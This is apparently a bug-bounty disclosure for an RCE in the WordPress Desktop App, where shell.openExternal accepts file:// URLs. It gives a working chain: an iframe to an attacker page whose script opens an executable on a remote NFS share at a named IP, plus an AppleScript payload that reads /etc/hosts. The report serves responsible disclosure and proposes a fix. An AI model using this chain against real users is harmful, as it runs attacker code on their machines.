    "vulnerability_information": "An attacker can create a malicious page that when viewed or edited in Wordpress Desktop App will results in remote code execution. \n\nThis issue looks to be around this line of code: \nhttps://github.com/Automattic/wp-desktop/blob/develop/desktop/window-handlers/external-links/index.js#L38\n\nIf shell.openExternal is sent a file:// url it will try to open that file in the default native application (instead of the default browser).  If we pass the an a .app file on MacOS or an exe it will just execute the code. \n\nWe also link to a remote readable NFS mount (or windows share) to point to a remote executable. \n\nA Wordpress page is created with: \n```\n<center><iframe style=\"border: 0;\" src=\"https://maustin.net/hax/wp_desktop/index.html\" width=\"250\" height=\"250\"></iframe></center>\u00a0\n```\n\nThis file has the following code: \n```\n   <script>\n      // window.open('file:///Applications/Calculator.app');\n      window.open('file:///net/192.241.239.91/var/nfs/general/hack2.app')\n   </script>\n```\n\nThe file at file:///net/192.241.239.91/var/nfs/general/hack2.app is a simple applescript Application with the following code:\n\n```\ntell application \"Terminal\"\n    do script \"cat /etc/hosts\"\n    display dialog \"You just got hacked!\"\nend tell\n\ndo shell script \"open -a Calculator\"\n```\n\n### POC\n1. Create the setup described above. \n2. Invite any wordpress.com user to edit. (or wait for them to follow you and click on your site in the \"reader\")\n3. Code is executed when the user views the page. \n\nSee attached video for a working POC. \n\n\n### Sugested Fix: \nBefore passing a url to shell.openExternal the application should validate that it begins with http:// or https://.\n\n## Impact\n\nAn attacker could target any individual with a wordpress.com account by inviting them to be an editor. When they simply view the page in the desktop application the code would run. \n\nThe remote attacker would be able to run any code as the current user on the system once the page is viewed.\n\nIn my testing I used a remote wordpress blog (with jetpack) so that I would be able to add an iframe. However I believe with a Business account a custom wordpress plugin could achieve the same result on a wordpress.com hosted account.",
